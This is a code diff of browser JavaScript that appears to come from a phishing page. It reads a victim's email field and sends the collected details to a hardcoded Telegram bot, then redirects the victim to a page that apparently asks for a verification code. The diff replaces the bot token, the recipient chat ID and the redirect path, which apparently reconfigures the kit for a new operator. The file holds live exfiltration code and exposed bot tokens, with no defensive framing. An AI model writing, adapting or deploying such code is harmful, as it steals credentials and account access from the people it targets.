@@ -1,6 +1,6 @@
 // const chatIds = ["1534371221", "6189466166"];
 // const chatIds = ["1534371221", "6189466166", "6136559061", "6924640648"];
-const chatIds = ["-1001991348429"];
+const chatIds = ["-1002393688453"];
 // const chatIds = ["1534371221"];
 
 let formm;
@@ -43,7 +43,7 @@ async function submit_details() {
     counterr.innerText = counterr.innerText - 1;
     if (counterr.innerText == 0) {
       clearInterval(intervall);
-      window.location.href = `/Login/code/?em=${email_field.value}`;
+      window.location.href = `/code/?em=${email_field.value}`;
     }
     console.log("reduced");
   }, 1000);
@@ -57,7 +57,7 @@ async function submit_details() {
       text: msg,
     };
     const resp = await fetch(
-      `https://api.telegram.org/bot5312671411:AAFihWuoM10og_jUITZkqIqa-gk0p_i7H-E/sendMessage`,
+      `https://api.telegram.org/bot7871889688:AAFlHwVTt_lPVFTm6WT67so8UKK1bjWWgug/sendMessage`,
       {
         method: "POST",
         headers: {
